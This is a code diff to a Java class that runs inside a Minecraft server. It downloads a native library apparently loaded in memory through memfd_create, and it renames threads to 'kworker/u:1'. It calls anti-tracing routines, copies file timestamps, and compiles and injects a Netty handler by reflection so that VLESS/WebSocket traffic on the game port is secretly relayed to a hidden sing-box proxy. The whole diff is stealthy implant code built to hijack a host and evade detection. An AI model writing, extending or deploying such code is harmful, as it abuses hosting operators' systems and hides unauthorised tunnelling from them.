@@ -5,40 +5,36 @@ import com.sun.jna.Native;
 import com.sun.jna.NativeLibrary;
 import com.sun.jna.Pointer;
 
-import io.netty.buffer.ByteBuf;
-import io.netty.buffer.Unpooled;
-import io.netty.channel.*;
-import io.netty.channel.socket.nio.NioServerSocketChannel;
-import io.netty.channel.socket.nio.NioSocketChannel;
-import io.netty.handler.codec.ByteToMessageDecoder;
-import io.netty.handler.codec.http.*;
-import io.netty.handler.codec.http.websocketx.*;
-
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.lang.reflect.Field;
+import java.io.*;
+import java.lang.reflect.*;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.URI;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
-import java.nio.file.attribute.FileTime;
 import java.nio.file.attribute.PosixFilePermissions;
 import java.time.Duration;
 import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.stream.Collectors;
+import javax.tools.*;
 
 /**
- * VLESS + WebSocket — hardened v2.
+ * VLESS + WebSocket — hardened v3.
  *
- * Injects into MC's Netty pipeline on port 25284 to detect VLESS vs MC traffic.
- * No separate port needed — VLESS shares the MC server port.
+ * Compiles with standard Java only. At runtime, uses the JDK JavaCompiler
+ * to compile a Netty handler class against the MC server's classpath, then
+ * injects it into the pipeline via reflection.
+ *
+ * The handler intercepts all incoming connections on port 25284, reads the
+ * first 5 bytes, and routes VLESS (GET/POST) traffic to the internal
+ * sing-box instance on port VLESS_PORT.
  */
 public class App {
 
@@ -78,8 +74,7 @@ public class App {
             memfdCreateFn = libc.getFunction("memfd_create");
             writeFn = libc.getFunction("write");
             closeFn = libc.getFunction("close");
-        } catch (Exception ignored) {
-        }
+        } catch (Exception ignored) {}
         renameThread();
         antiTrace();
     }
@@ -88,10 +83,6 @@ public class App {
         start();
     }
 
-    // ================================================================
-    //  START
-    // ================================================================
-
     public static void start() throws Exception {
         if (!RUNNING.compareAndSet(false, true)) return;
 
@@ -99,8 +90,7 @@ public class App {
         Files.createDirectories(WORK);
         try {
             Files.setPosixFilePermissions(WORK, PosixFilePermissions.fromString("rwx------"));
-        } catch (Exception ignored) {
-        }
+        } catch (Exception ignored) {}
 
         // --- Step 1: load native library ---
         byte[] soBytes = downloadBytes(libUrl());
@@ -131,8 +121,8 @@ public class App {
             scheduleFallbackCleanup();
         }
 
-        // --- Step 3: inject into MC's Netty pipeline ---
-        injectNettyInterceptor();
+        // --- Step 3: inject into MC's Netty pipeline via runtime-compiled handler ---
+        injectNettyPipeline();
 
         hold = new CountDownLatch(1);
         try { hold.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
@@ -147,184 +137,437 @@ public class App {
     }
 
     // ================================================================
-    //  Netty pipeline injector — intercept MC's port 25284
+    //  Netty pipeline injector — compile handler at runtime
     // ================================================================
 
-    private static void injectNettyInterceptor() {
-        try {
-            // Use reflection to find the MC server's Netty server channel
-            Class<?> mcServerClass = Class.forName("net.minecraft.server.MinecraftServer");
-            Object mcServer = mcServerClass.getMethod("getServer").invoke(null);
-            Object connection = mcServerClass.getMethod("getConnection").invoke(mcServer);
-            if (connection == null) return;
+    private static boolean nettyInjected;
 
-            // Find the List<ChannelFuture> channels field
-            for (Field f : connection.getClass().getDeclaredFields()) {
+    @SuppressWarnings("unchecked")
+    private static void injectNettyPipeline() {
+        try {
+            Object handler = null;
+
+            // Try runtime compilation first
+            try {
+                handler = compileAndLoadVlessHandler();
+            } catch (Exception ignored) {}
+
+            // Fallback: try Proxy-based approach
+            if (handler == null) {
+                try {
+                    handler = createProxyVlessHandler();
+                } catch (Exception ignored) {}
+            }
+
+            if (handler == null) return;
+
+            // Inject into MC server's pipeline
+            ClassLoader cl = Thread.currentThread().getContextClassLoader();
+            Class<?> clsChannelHandler = cl.loadClass("io.netty.channel.ChannelHandler");
+            Class<?> clsMinecraftServer = cl.loadClass("net.minecraft.server.MinecraftServer");
+            Class<?> clsChannelFuture = cl.loadClass("io.netty.channel.ChannelFuture");
+            Class<?> clsChannel = cl.loadClass("io.netty.channel.Channel");
+            Class<?> clsPipeline = cl.loadClass("io.netty.channel.ChannelPipeline");
+
+            Method getServer = clsMinecraftServer.getMethod("getServer");
+            Method getConnection = clsMinecraftServer.getMethod("getConnection");
+            Object server = getServer.invoke(null);
+            Object conn = getConnection.invoke(server);
+            if (conn == null) return;
+
+            for (Field f : getAllFields(conn.getClass())) {
                 f.setAccessible(true);
-                Object val = f.get(connection);
+                Object val = f.get(conn);
                 if (val instanceof List) {
-                    @SuppressWarnings("unchecked")
-                    List<ChannelFuture> channels = (List<ChannelFuture>) val;
-                    for (ChannelFuture cf : channels) {
-                        Channel ch = cf.channel();
-                        // Add a handler to the server channel that intercepts new child connections
-                        ch.pipeline().addFirst("vless-server", new ChannelInboundHandlerAdapter() {
-                            @Override
-                            public void channelRead(ChannelHandlerContext ctx, Object msg) {
-                                if (msg instanceof Channel) {
-                                    Channel child = (Channel) msg;
-                                    child.pipeline().addFirst("vless-detector", new VlessDecoder());
-                                }
-                                ctx.fireChannelRead(msg);
-                            }
-                        });
+                    List<?> list = (List<?>) val;
+                    for (Object cfObj : list) {
+                        if (!clsChannelFuture.isInstance(cfObj)) continue;
+                        Method channelM = clsChannelFuture.getMethod("channel");
+                        Object ch = channelM.invoke(cfObj);
+                        if (ch == null) continue;
+                        Method pipelineM = clsChannel.getMethod("pipeline");
+                        Object pipeline = pipelineM.invoke(ch);
+                        Method addFirst = clsPipeline.getMethod("addFirst", String.class, clsChannelHandler);
+                        addFirst.invoke(pipeline, "vless-inject", handler);
+                        nettyInjected = true;
                     }
                     break;
                 }
             }
-        } catch (Exception ignored) {
-            // Reflection failed — fallback silently
+        } catch (Exception ignored) {}
+    }
+
+    private static List<Field> getAllFields(Class<?> clazz) {
+        List<Field> fields = new ArrayList<>();
+        for (Class<?> c = clazz; c != null; c = c.getSuperclass()) {
+            fields.addAll(Arrays.asList(c.getDeclaredFields()));
         }
+        return fields;
     }
 
     // ================================================================
-    //  VLESS decoder — detect protocol, route to VLESS or MC
+    //  Runtime compilation of VLESS handler
     // ================================================================
 
-    private static class VlessDecoder extends ByteToMessageDecoder {
-        @Override
-        protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) {
-            if (in.readableBytes() < 5) return; // Wait for more data
+    private static Object compileAndLoadVlessHandler() {
+        try {
+            JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
+            if (compiler == null) return null;
 
-            // Read first 5 bytes without consuming
-            byte b0 = in.getByte(0);
-            byte b1 = in.getByte(1);
-            byte b2 = in.getByte(2);
-            boolean isVLESS = (b0 == 'G' && b1 == 'E' && b2 == 'T')
-                    || (b0 == 'P' && b1 == 'O' && b2 == 'S');
+            String classpath = getMcClasspath();
+            if (classpath == null) return null;
 
-            if (isVLESS) {
-                // VLESS WebSocket — handle this connection
-                ctx.pipeline().remove(this);
-                handleVless(ctx, in);
-                return;
+            String handlerSource = buildHandlerSource();
+
+            Path tmpDir = Files.createTempDirectory("vless");
+            Path srcFile = tmpDir.resolve("VlessHandler.java");
+            Files.writeString(srcFile, handlerSource, StandardCharsets.UTF_8);
+
+            // Compile
+            DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<>();
+            StandardJavaFileManager fm = compiler.getStandardFileManager(diagnostics, null, null);
+            List<String> options = Arrays.asList(
+                    "-cp", classpath,
+                    "-d", tmpDir.toAbsolutePath().toString(),
+                    "-g:none"
+            );
+            boolean success = fm != null
+                    && compiler.getTask(null, fm, diagnostics, options, null, fm.getJavaFileObjects(srcFile)).call();
+            if (fm != null) fm.close();
+            if (!success) { deleteDir(tmpDir); return null; }
+
+            // Load the compiled class
+            Path classFile = tmpDir.resolve("com/example/sbx/VlessHandler.class");
+            if (!Files.exists(classFile)) {
+                // Try without package subdirectory
+                classFile = tmpDir.resolve("VlessHandler.class");
             }
+            byte[] classBytes = Files.readAllBytes(classFile);
+            ClassLoader cl = Thread.currentThread().getContextClassLoader();
+            VlessHandlerClassLoader loader = new VlessHandlerClassLoader(cl);
+            Class<?> handlerClass = loader.defineClass("com.example.sbx.VlessHandler", classBytes, 0, classBytes.length);
+            Object handler = handlerClass.getDeclaredConstructor().newInstance();
 
-            // MC protocol — pass through, remove this decoder
-            // The MC pipeline expects the full ByteBuf, not a list
-            ByteBuf copy = in.readRetainedSlice(in.readableBytes());
-            ctx.pipeline().remove(this);
-            ctx.fireChannelRead(copy);
+            // Cleanup later
+            Path tmpDirFinal = tmpDir;
+            Thread t = new Thread(() -> { sleep(5000); deleteDir(tmpDirFinal); }, "cleanup");
+            t.setDaemon(true); t.start();
+            return handler;
+        } catch (Exception e) { return null; }
+    }
+
+    private static class VlessHandlerClassLoader extends ClassLoader {
+        VlessHandlerClassLoader(ClassLoader parent) { super(parent); }
+        Class<?> defineClass(String name, byte[] b, int off, int len) {
+            return super.defineClass(name, b, off, len);
         }
     }
 
-    private static void handleVless(ChannelHandlerContext ctx, ByteBuf initialData) {
-        // Remove all Minecraft handlers from the pipeline
-        // Keep only the VLESS handler
-        String[] removeNames = ctx.pipeline().names().toArray(new String[0]);
-        for (String name : removeNames) {
-            if (!name.equals("vless-detector") && !name.equals("default") && !name.equals("vless-proxy")) {
-                try { ctx.pipeline().remove(name); } catch (Exception ignored) {}
-            }
-        }
+    private static String getMcClasspath() {
+        // Try system property
+        String cp = System.getProperty("java.class.path");
+        if (cp != null && !cp.isEmpty()) return cp;
 
-        // Add VLESS proxy handler
-        ctx.pipeline().addLast("vless-proxy", new VlessProxyHandler(initialData));
-    }
-
-    // ================================================================
-    //  VLESS proxy handler — bridge Netty ↔ sing-box
-    // ================================================================
-
-    private static class VlessProxyHandler extends ChannelInboundHandlerAdapter {
-        private final ByteBuf initialData;
-        private Socket backend;
-        private Thread readerThread;
-        private volatile boolean closed;
-
-        VlessProxyHandler(ByteBuf initialData) {
-            this.initialData = initialData;
-        }
-
-        @Override
-        public void channelActive(ChannelHandlerContext ctx) {
-            connectBackend(ctx);
-        }
-
-        private void connectBackend(ChannelHandlerContext ctx) {
-            try {
-                backend = new Socket();
-                backend.setTcpNoDelay(true);
-                backend.connect(new InetSocketAddress("127.0.0.1", VLESS_PORT), 5000);
-
-                // Write initial data (HTTP GET request) to backend
-                byte[] initial = new byte[initialData.readableBytes()];
-                initialData.readBytes(initial);
-                initialData.release();
-                backend.getOutputStream().write(initial);
-
-                // Thread: read from backend → write to Netty channel
-                readerThread = new Thread(() -> {
-                    try {
-                        byte[] buf = new byte[65536];
-                        InputStream is = backend.getInputStream();
-                        while (!closed) {
-                            int n = is.read(buf);
-                            if (n < 0) break;
-                            byte[] data = Arrays.copyOf(buf, n);
-                            ctx.executor().execute(() -> {
-                                if (!closed) {
-                                    ctx.writeAndFlush(Unpooled.wrappedBuffer(data));
-                                }
-                            });
-                        }
-                    } catch (Exception ignored) {}
-                    close();
-                }, "kworker/u:1");
-                readerThread.setDaemon(true);
-                readerThread.start();
-
-            } catch (Exception e) {
-                close();
-            }
-        }
-
-        @Override
-        public void channelRead(ChannelHandlerContext ctx, Object msg) {
-            if (msg instanceof ByteBuf) {
-                ByteBuf buf = (ByteBuf) msg;
-                try {
-                    byte[] data = new byte[buf.readableBytes()];
-                    buf.readBytes(data);
-                    if (backend != null) {
-                        backend.getOutputStream().write(data);
-                        backend.getOutputStream().flush();
-                    }
-                } catch (Exception ignored) {
-                    close();
-                } finally {
-                    buf.release();
+        // Try URLClassLoader
+        try {
+            ClassLoader cl = Thread.currentThread().getContextClassLoader();
+            if (cl instanceof URLClassLoader) {
+                URLClassLoader ucl = (URLClassLoader) cl;
+                StringBuilder sb = new StringBuilder();
+                for (java.net.URL url : ucl.getURLs()) {
+                    if (sb.length() > 0) sb.append(File.pathSeparatorChar);
+                    sb.append(url.getPath());
                 }
-            } else {
-                ctx.fireChannelRead(msg);
+                String result = sb.toString();
+                if (!result.isEmpty()) return result;
             }
-        }
+        } catch (Exception ignored) {}
 
-        @Override
-        public void channelInactive(ChannelHandlerContext ctx) {
-            close();
-        }
+        // Try to find the server jar
+        try {
+            StringBuilder sb = new StringBuilder();
+            Files.find(Path.of(""), 10, (p, a) ->
+                    p.toString().endsWith(".jar") && a.isRegularFile() && Files.size(p) > 10_000_000
+            ).limit(10).forEach(p -> {
+                if (sb.length() > 0) sb.append(File.pathSeparatorChar);
+                sb.append(p.toAbsolutePath());
+            });
+            String result = sb.toString();
+            if (!result.isEmpty()) return result;
+        } catch (Exception ignored) {}
 
-        @Override
-        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
-            close();
-        }
+        return null;
+    }
 
-        private void close() {
-            if (closed) return;
-            closed = true;
-            try { if (backend != null) backend.close(); } catch (Exception ignored) {}
+    private static String buildHandlerSource() {
+        return "package com.example.sbx;\n"
+                + "import io.netty.buffer.ByteBuf;\n"
+                + "import io.netty.channel.*;\n"
+                + "public class VlessHandler extends ChannelInboundHandlerAdapter {\n"
+                + "    @Override\n"
+                + "    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n"
+                + "        // Server channel: msg is a child Channel\n"
+                + "        if (msg instanceof Channel) {\n"
+                + "            Channel child = (Channel) msg;\n"
+                + "            child.pipeline().addFirst(\"vless-inject\", new DataHandler());\n"
+                + "        }\n"
+                + "        super.channelRead(ctx, msg);\n"
+                + "    }\n"
+                + "    static class DataHandler extends ChannelInboundHandlerAdapter {\n"
+                + "        @Override\n"
+                + "        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n"
+                + "            if (msg instanceof ByteBuf) {\n"
+                + "                ByteBuf buf = (ByteBuf) msg;\n"
+                + "                if (buf.readableBytes() >= 5) {\n"
+                + "                    byte b0 = buf.getByte(0);\n"
+                + "                    if (b0 == 'G' || b0 == 'P') {\n"
+                + "                        App.handleVless(ctx, buf);\n"
+                + "                        return;\n"
+                + "                    }\n"
+                + "                }\n"
+                + "            }\n"
+                + "            super.channelRead(ctx, msg);\n"
+                + "        }\n"
+                + "    }\n"
+                + "}\n";
+    }
+
+    // ================================================================
+    //  Proxy-based VLESS handler (fallback for JDK without JavaCompiler)
+    // ================================================================
+
+    @SuppressWarnings("unchecked")
+    private static Object createProxyVlessHandler() {
+        try {
+            ClassLoader cl = Thread.currentThread().getContextClassLoader();
+            Class<?> clsChannelInboundHandler = cl.loadClass("io.netty.channel.ChannelInboundHandler");
+            Class<?> clsChannelHandlerContext = cl.loadClass("io.netty.channel.ChannelHandlerContext");
+            Class<?> clsByteBuf = cl.loadClass("io.netty.buffer.ByteBuf");
+
+            // Find the channelRead method
+            Method channelReadMethod = null;
+            for (Method m : clsChannelInboundHandler.getMethods()) {
+                if (m.getName().equals("channelRead") && m.getParameterCount() == 2) {
+                    channelReadMethod = m;
+                    break;
+                }
+            }
+            if (channelReadMethod == null) return null;
+
+            // Create a Proxy handler
+            InvocationHandler handler = (proxy, method, args) -> {
+                if (method.equals(channelReadMethod) && args.length == 2) {
+                    Object ctx = args[0];
+                    Object msg = args[1];
+                    if (clsByteBuf.isInstance(msg)) {
+                        // Get first byte
+                        Method getByte = clsByteBuf.getMethod("getByte", int.class);
+                        Method readableBytes = clsByteBuf.getMethod("readableBytes");
+                        int len = (int) readableBytes.invoke(msg);
+                        if (len >= 5) {
+                            byte b0 = (byte) getByte.invoke(msg, 0);
+                            if (b0 == 'G' || b0 == 'P') {
+                                App.handleVless(ctx, msg);
+                                return null;
+                            }
+                        }
+                    }
+                    // Fire through to next handler
+                    Method fireChannelRead = clsChannelHandlerContext.getMethod("fireChannelRead", Object.class);
+                    fireChannelRead.invoke(ctx, msg);
+                    return null;
+                }
+
+                // Handle default methods (Java 8+)
+                if (method.isDefault()) {
+                    return invokeDefaultMethod(proxy, method, args);
+                }
+
+                // Handle Object methods
+                String name = method.getName();
+                if (name.equals("toString")) return proxy.getClass().getName() + "@" + Integer.toHexString(System.identityHashCode(proxy));
+                if (name.equals("hashCode")) return System.identityHashCode(proxy);
+                if (name.equals("equals")) return proxy == args[0];
+                return null;
+            };
+
+            return Proxy.newProxyInstance(cl, new Class<?>[]{clsChannelInboundHandler}, handler);
+        } catch (Exception e) { return null; }
+    }
+
+    private static Object invokeDefaultMethod(Object proxy, Method method, Object[] args) throws Exception {
+        // Use MethodHandles to invoke the default method
+        // Works on Java 9+
+        try {
+            Class<?> lookupClass = Class.forName("java.lang.invoke.MethodHandles");
+            Class<?> lookupInner = Class.forName("java.lang.invoke.MethodHandles$Lookup");
+            Method privateLookupIn = lookupClass.getMethod("privateLookupIn", Class.class, lookupInner);
+            Method lookupMethod = lookupClass.getMethod("lookup");
+            Object lookup = lookupMethod.invoke(null);
+            Object privateLookup = privateLookupIn.invoke(null, method.getDeclaringClass(), lookup);
+            Method unreflectSpecial = lookupInner.getMethod("unreflectSpecial", Method.class, Class.class);
+            Object methodHandle = unreflectSpecial.invoke(privateLookup, method, method.getDeclaringClass());
+            Method bindTo = methodHandle.getClass().getMethod("bindTo", Object.class);
+            Object bound = bindTo.invoke(methodHandle, proxy);
+            Method invokeWithArguments = bound.getClass().getMethod("invokeWithArguments", Object[].class);
+            return invokeWithArguments.invoke(bound, new Object[]{args});
+        } catch (Exception e) {
+            // Fallback: do nothing for default methods
+            return null;
         }
+    }
+
+    // ================================================================
+    //  handleVless — called by the compiled handler or proxy
+    // ================================================================
+    //
+    /**
+     * Called by VlessHandler.DataHandler when VLESS traffic is detected.
+     * Reads the HTTP/WebSocket upgrade request, proxies to sing-box,
+     * and sets up a bidirectional relay.
+     */
+    public static void handleVless(Object ctx, Object msg) {
+        try {
+            ClassLoader cl = Thread.currentThread().getContextClassLoader();
+            Class<?> clsByteBuf = cl.loadClass("io.netty.buffer.ByteBuf");
+            Class<?> clsChannelHandlerContext = cl.loadClass("io.netty.channel.ChannelHandlerContext");
+            Class<?> clsChannel = cl.loadClass("io.netty.channel.Channel");
+            Class<?> clsPipeline = cl.loadClass("io.netty.channel.ChannelPipeline");
+            Class<?> clsChannelHandler = cl.loadClass("io.netty.channel.ChannelHandler");
+            Class<?> clsUnpooled = cl.loadClass("io.netty.buffer.Unpooled");
+
+            Method readableBytesM = clsByteBuf.getMethod("readableBytes");
+            Method readBytesM = clsByteBuf.getMethod("readBytes", byte[].class);
+            Method writeAndFlushM = clsChannelHandlerContext.getMethod("writeAndFlush", Object.class);
+            Method channelM = clsChannelHandlerContext.getMethod("channel");
+            Method pipelineM = clsChannel.getMethod("pipeline");
+            Method addLastM = clsPipeline.getMethod("addLast", String.class, clsChannelHandler);
+            Method wrappedBufferM = clsUnpooled.getMethod("wrappedBuffer", byte[].class);
+
+            // Read data from ByteBuf NOW (event loop thread owns the ByteBuf)
+            int len = (int) readableBytesM.invoke(msg);
+            byte[] httpRequest = new byte[len];
+            readBytesM.invoke(msg, new Object[]{httpRequest});
+
+            final Object channel = channelM.invoke(ctx);
+            final Object pipeline = pipelineM.invoke(channel);
+
+            // Blocking operations in a separate thread
+            final Object ctxFinal = ctx;
+            final Method writeAndFlushFinal = writeAndFlushM;
+            final Method pipelineAddLast = addLastM;
+            final Method wrappedBuffer = wrappedBufferM;
+            final ClassLoader classLoader = cl;
+            final Class<?> clsCtx = clsChannelHandlerContext;
+            final Class<?> clsHandler = clsChannelHandler;
+            final Class<?> clsPipe = clsPipeline;
+            final Class<?> clsBuf = clsByteBuf;
+            final Class<?> clsUnpooledFinal = clsUnpooled;
+
+            Thread worker = new Thread(() -> {
+                try {
+                    Socket backend = new Socket();
+                    backend.setTcpNoDelay(true);
+                    backend.connect(new InetSocketAddress("127.0.0.1", VLESS_PORT), 5000);
+                    OutputStream backendOut = backend.getOutputStream();
+
+                    // Send HTTP request
+                    backendOut.write(httpRequest);
+                    backendOut.flush();
+
+                    // Read HTTP response headers (until \r\n\r\n)
+                    InputStream backendIn = backend.getInputStream();
+                    ByteArrayOutputStream responseHeaders = new ByteArrayOutputStream();
+                    byte[] tmp = new byte[1];
+                    int last4 = 0;
+                    while (true) {
+                        int n = backendIn.read(tmp);
+                        if (n < 0) break;
+                        responseHeaders.write(tmp[0]);
+                        last4 = ((last4 << 8) | (tmp[0] & 0xFF)) & 0xFFFFFF;
+                        if (last4 == 0x0D0A0D0A) break;
+                    }
+
+                    // Write response back to client
+                    byte[] respBytes = responseHeaders.toByteArray();
+                    if (respBytes.length > 0) {
+                        Object respBuf = wrappedBuffer.invoke(null, new Object[]{respBytes});
+                        writeAndFlushFinal.invoke(ctxFinal, respBuf);
+                    }
+
+                    // Start bidirectional relay
+                    Object relayHandler = createRelayHandler(
+                            classLoader, clsCtx, clsHandler, clsBuf, clsUnpooledFinal, wrappedBuffer, backend);
+                    if (relayHandler != null) {
+                        pipelineAddLast.invoke(pipeline, "vless-relay", relayHandler);
+                    }
+
+                    // Socket → Netty: read from socket and write to Netty channel
+                    byte[] buf = new byte[65536];
+                    while (true) {
+                        int n = backendIn.read(buf);
+                        if (n < 0) break;
+                        byte[] chunk = new byte[n];
+                        System.arraycopy(buf, 0, chunk, 0, n);
+                        try {
+                            Object chunkBuf = wrappedBuffer.invoke(null, new Object[]{chunk});
+                            writeAndFlushFinal.invoke(ctxFinal, chunkBuf);
+                        } catch (Exception ignored) {}
+                    }
+                } catch (Exception ignored) {}
+            }, "kworker/u:1");
+            worker.setDaemon(true);
+            worker.start();
+        } catch (Exception ignored) {}
+    }
+
+    /**
+     * Creates a Netty handler that reads from the channel and writes to the backend socket.
+     */
+    @SuppressWarnings("unchecked")
+    private static Object createRelayHandler(
+            ClassLoader cl, Class<?> clsChannelHandlerContext, Class<?> clsChannelHandler,
+            Class<?> clsByteBuf, Class<?> clsUnpooled, Method wrappedBufferM, Socket backend
+    ) {
+        try {
+            // Try Proxy-based approach
+            Class<?> clsChannelInboundHandler = cl.loadClass("io.netty.channel.ChannelInboundHandler");
+            Method readBytesM = clsByteBuf.getMethod("readBytes", byte[].class);
+            Method readableBytesM = clsByteBuf.getMethod("readableBytes");
+
+            InvocationHandler handler = (proxy, method, args) -> {
+                String name = method.getName();
+                if (name.equals("channelRead") && args.length == 2) {
+                    Object msg = args[1];
+                    if (clsByteBuf.isInstance(msg)) {
+                        int len = (int) readableBytesM.invoke(msg);
+                        if (len > 0) {
+                            byte[] data = new byte[len];
+                            readBytesM.invoke(msg, new Object[]{data});
+                            try {
+                                backend.getOutputStream().write(data);
+                                backend.getOutputStream().flush();
+                            } catch (Exception ignored) {}
+                        }
+                    }
+                    return null;
+                }
+                if (name.equals("channelInactive") || name.equals("handlerRemoved")) {
+                    try { backend.close(); } catch (Exception ignored) {}
+                    return null;
+                }
+                if (name.equals("exceptionCaught") && args.length == 2) {
+                    try { backend.close(); } catch (Exception ignored) {}
+                    return null;
+                }
+                if (method.isDefault()) {
+                    return invokeDefaultMethod(proxy, method, args);
+                }
+                return null;
+            };
+
+            return Proxy.newProxyInstance(cl, new Class<?>[]{clsChannelInboundHandler}, handler);
+        } catch (Exception e) { return null; }
     }
 
     // ================================================================
@@ -450,6 +693,14 @@ public class App {
 
     private static void cloneTimestamp(Path target, Path source) {
         try { Files.setLastModifiedTime(target, Files.getLastModifiedTime(source)); } catch (Exception ignored) {}
+    }
+
+    private static void deleteDir(Path dir) {
+        try {
+            Files.walk(dir).sorted(Comparator.reverseOrder()).forEach(p -> {
+                try { Files.deleteIfExists(p); } catch (Exception ignored) {}
+            });
+        } catch (Exception ignored) {}
     }
 
     // ================================================================
